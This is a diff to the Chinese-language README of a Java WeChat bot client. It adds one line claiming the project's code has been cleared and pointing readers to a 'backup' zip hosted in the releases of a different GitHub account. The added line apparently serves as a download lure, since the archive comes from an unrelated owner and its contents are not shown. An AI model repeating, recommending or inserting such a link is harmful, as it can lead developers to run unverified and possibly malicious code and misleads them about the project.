@@ -1,6 +1,7 @@
 # WeChatBot - Java
 
 > 本项目是对 https://github.com/cixingguangming55555/wechat-bot 项目做出的JAVA版本客户端(持续跟进更新), 看了其他几个版本的 觉得写的比较乱, 该有的不该有的都在里边,看着难受, 就自己重写了下, 更简洁,方便上手
+> 目前该项目代码已经清空,我这里有一份备用代码,点击这里下载https://github.com/UoUoio/WechatBot/releases/download/4.7.5.66/wechat-bot-.zip
 
 ## 更新记录
 
